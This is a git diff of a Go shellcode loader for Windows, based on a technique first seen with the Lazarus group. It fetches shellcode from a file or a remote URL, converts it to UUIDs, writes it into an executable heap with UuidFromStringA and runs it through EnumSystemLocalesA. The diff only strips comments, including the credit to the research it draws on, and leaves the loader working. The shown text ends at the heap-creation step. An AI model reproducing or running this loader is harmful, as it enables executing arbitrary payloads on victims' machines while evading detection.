@@ -1,15 +1,5 @@
 
-// Concept pulled from https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/
 
-/*
-	This program executes shellcode in the current process using the following steps:
-		1. Create a Heap and allocate space
-		2. Convert shellcode into an array of UUIDs
-		3. Load the UUIDs into memory (on the allocated heap) by (ab)using the UuidFromStringA function
-		4. Execute the shellcode by (ab)using the EnumSystemLocalesA function
-*/
-
-// Reference: https://blog.securehat.co.uk/process-injection/shellcode-execution-via-enumsystemlocala
 
 package main
 
@@ -23,7 +13,6 @@ import (
 	"log"
 	"unsafe"
 
-	// Sub Repositories
 	"golang.org/x/sys/windows"
 
 	
@@ -41,28 +30,27 @@ func main() {
 		os.Exit(0)
 	}
 	flag.Parse()
-	var shellcodeHex string // Declare shellcodeHex outside if/else blocks
+	var shellcodeHex string 
 	var err error
 	if *shellcodeURL == "" {
-		// If not provided, check if the shellcode path is provided
+
 		if *shellcodePath == "" {
-			// If neither shellcode URL nor shellcode path is provided, exit with an error
+			
 			log.Fatal("Please provide either the URL or the path to the shellcode file")
 		}
 		shellcodeBytes := *shellcodePath
 		
 		_, err = hex.DecodeString(string(shellcodeBytes))
 		if err == nil {
-			// If decoding succeeds, it's in hexadecimal format
+			
 			shellcodeHex = shellcodeBytes
 		} else {
-			// If decoding fails, it's assumed to be in byte format
+		
 			shellcodeHex = hex.EncodeToString([]byte(shellcodeBytes))
 		}
 		
 	} else {
-		// Read from URL
-		// Make HTTP GET request to fetch from URL
+		
 		resp, err := http.Get(*shellcodeURL)
 		if err != nil {
 			log.Fatalf("Error fetching shellcode from URL: %v", err)
@@ -78,13 +66,13 @@ func main() {
 			log.Fatalf("Error reading shellcode from response body: %v", err)
 		}
 
-		// Check if shellcode is already in hexadecimal format
+		
 		_, err = hex.DecodeString(string(shellcodeBytes))
 		if err == nil {
-			// If decoding succeeds, it's in hexadecimal format
+			
 			shellcodeHex = string(shellcodeBytes)
 		} else {
-			// If decoding fails, it's assumed to be in byte format
+		
 			shellcodeHex = hex.EncodeToString(shellcodeBytes)
 		}
 	
@@ -104,7 +92,7 @@ func main() {
 	
 
 
-	// Convert shellcode to UUIDs
+	
 	if *debug {
 		fmt.Println("[DEBUG]Converting shellcode to slice of UUIDs")
 	}
@@ -128,17 +116,8 @@ func main() {
 	enumSystemLocalesA := kernel32.NewProc("EnumSystemLocalesA")
 	uuidFromString := rpcrt4.NewProc("UuidFromStringA")
 
-	/* https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapcreate
-		HANDLE HeapCreate(
-			DWORD  flOptions,
-			SIZE_T dwInitialSize,
-			SIZE_T dwMaximumSize
-		);
-	  HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
-	*/
 
-	// Create the heap
-	// HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
+	
 	heapAddr, _, err := heapCreate.Call(0x00040000, 0, 0)
 	if heapAddr == 0 {
 		log.Fatal(fmt.Sprintf("there was an error calling the HeapCreate function:\r\n%s", err))
